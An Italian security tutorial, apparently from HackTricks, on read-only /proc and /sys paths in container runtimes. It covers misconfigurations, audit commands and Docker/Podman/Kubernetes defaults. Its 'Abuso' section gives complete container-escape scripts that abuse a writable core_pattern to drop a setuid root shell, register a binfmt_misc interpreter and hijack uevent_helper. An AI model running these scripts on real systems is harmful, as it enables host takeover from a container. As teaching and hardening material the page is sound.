# Percorsi di sistema in sola lettura

{{#include ../../../../banners/hacktricks-training.md}}

I percorsi di sistema in sola lettura sono una protezione distinta rispetto ai percorsi mascherati. Invece di nascondere completamente un percorso, il runtime lo espone ma lo monta in sola lettura. Questo è comune per alcune posizioni di procfs e sysfs dove l'accesso in lettura può essere accettabile o operativo necessario, ma le scritture sarebbero troppo pericolose.

Lo scopo è semplice: molte interfacce del kernel diventano molto più pericolose quando sono scrivibili. Un mount in sola lettura non elimina completamente il valore per la ricognizione, ma impedisce a un workload compromesso di modificare i file rivolti al kernel attraverso quel percorso.

## Funzionamento

I runtime spesso segnano parti della vista proc/sys come in sola lettura. A seconda del runtime e dell'host, questo può includere percorsi come:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La lista effettiva varia, ma il modello è lo stesso: consentire la visibilità dove necessario, negare la mutazione per impostazione predefinita.

## Laboratorio

Ispeziona la lista dei percorsi in sola lettura dichiarata da Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Ispeziona la vista montata di proc/sys dall'interno del container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impatto sulla sicurezza

I percorsi di sistema in sola lettura riducono una vasta classe di abusi che impattano l'host. Anche quando un attacker può ispezionare procfs o sysfs, l'impossibilità di scriverci elimina molte vie di modifica dirette che coinvolgono kernel tunables, crash handlers, module-loading helpers o altre interfacce di controllo. L'esposizione non scompare del tutto, ma la transizione da information disclosure a host influence diventa più difficile.

## Errori di configurazione

Gli errori principali sono lo unmasking o il remount in lettura-scrittura di percorsi sensibili, l'esposizione diretta del contenuto host proc/sys tramite writable bind mounts, o l'uso di modalità privileged che di fatto bypassano i default di runtime più sicuri. In Kubernetes, `procMount: Unmasked` e i workload privileged spesso vanno di pari passo con una protezione di proc più debole. Un altro errore operativo comune è presumere che, poiché il runtime di solito monta questi percorsi in sola lettura, tutti i workload stiano ancora ereditando quel default.

## Abuso

Se la protezione è debole, inizia cercando voci proc/sys scrivibili:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando sono presenti voci scrivibili, i percorsi successivi ad alto valore includono:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Voci scrivibili sotto `/proc/sys` spesso significano che il container può modificare il comportamento del kernel host invece di limitarsi a ispezionarlo.
- `core_pattern` è particolarmente importante perché un valore esposto all'host scrivibile può essere trasformato in un percorso di esecuzione di codice sull'host facendo crashare un processo dopo aver impostato un pipe handler.
- `modprobe` rivela l'helper usato dal kernel per i flussi relativi al caricamento dei moduli; è un classico obiettivo ad alto valore quando è scrivibile.
- `binfmt_misc` indica se è possibile la registrazione di interpreti custom. Se la registrazione è scrivibile, questo può diventare una primitive di esecuzione invece di essere solo un leak informativo.
- `panic_on_oom` controlla una decisione del kernel a livello host e può quindi trasformare l'esaurimento delle risorse in un denial of service sull'host.
- `uevent_helper` è uno degli esempi più chiari di un percorso helper sysfs scrivibile che produce esecuzione nel contesto dell'host.

Risultati interessanti includono proc knobs o voci sysfs rivolte all'host scrivibili che normalmente dovrebbero essere di sola lettura. A quel punto, il workload è passato da una vista container limitata verso un'influenza significativa sul kernel.

### Esempio completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` è scrivibile dall'interno del container e punta alla vista del kernel dell'host, può essere abusato per eseguire un payload dopo un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se il percorso raggiunge realmente il kernel dell'host, il payload viene eseguito sull'host e lascia indietro una shell setuid.

### Esempio completo: registrazione di `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` è scrivibile, la registrazione di un interprete personalizzato può provocare l'esecuzione di codice quando il file corrispondente viene eseguito:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Su un `binfmt_misc` scrivibile esposto all'host, il risultato è l'esecuzione di codice nel percorso dell'interprete invocato dal kernel.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può invocare un host-path helper quando si verifica un evento corrispondente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Il motivo per cui questo è così pericoloso è che l'helper path viene risolto dalla prospettiva del filesystem dell'host anziché da un contesto sicuro container-only.

## Controlli

Questi controlli determinano se l'esposizione di procfs/sysfs è in sola lettura dove previsto e se il workload può ancora modificare interfacce del kernel sensibili.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Cosa c'è di interessante qui:

- Un normale carico di lavoro rafforzato dovrebbe esporre pochissime voci scrivibili in /proc/sys.
- I percorsi /proc/sys scrivibili sono spesso più importanti rispetto al semplice accesso in sola lettura.
- Se il runtime dichiara che un percorso è in sola lettura ma in pratica è scrivibile, rivedi attentamente mount propagation, bind mounts e le impostazioni di privilegio.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | Docker definisce una lista predefinita di percorsi in sola lettura per le voci sensibili di proc | esposizione dei mount /proc/sys dell'host, `--privileged` |
| Podman | Abilitato per impostazione predefinita | Podman applica percorsi in sola lettura predefiniti a meno che non vengano esplicitamente rilassati | `--security-opt unmask=ALL`, ampie mount dell'host, `--privileged` |
| Kubernetes | Eredita le impostazioni predefinite del runtime | Usa il modello di percorsi in sola lettura del runtime sottostante a meno che non venga indebolito dalle impostazioni del Pod o dai mount dell'host | `procMount: Unmasked`, workload privilegiate, mount /proc/sys dell'host scrivibili |
| containerd / CRI-O under Kubernetes | Predefinito del runtime | Di solito si basa sui default di OCI/runtime | stesso della riga Kubernetes; modifiche dirette alla configurazione del runtime possono indebolire il comportamento |

Il punto chiave è che i percorsi di sistema in sola lettura sono generalmente presenti come impostazione predefinita del runtime, ma sono facili da compromettere con modalità privilegiate o bind mounts dell'host.
{{#include ../../../../banners/hacktricks-training.md}}
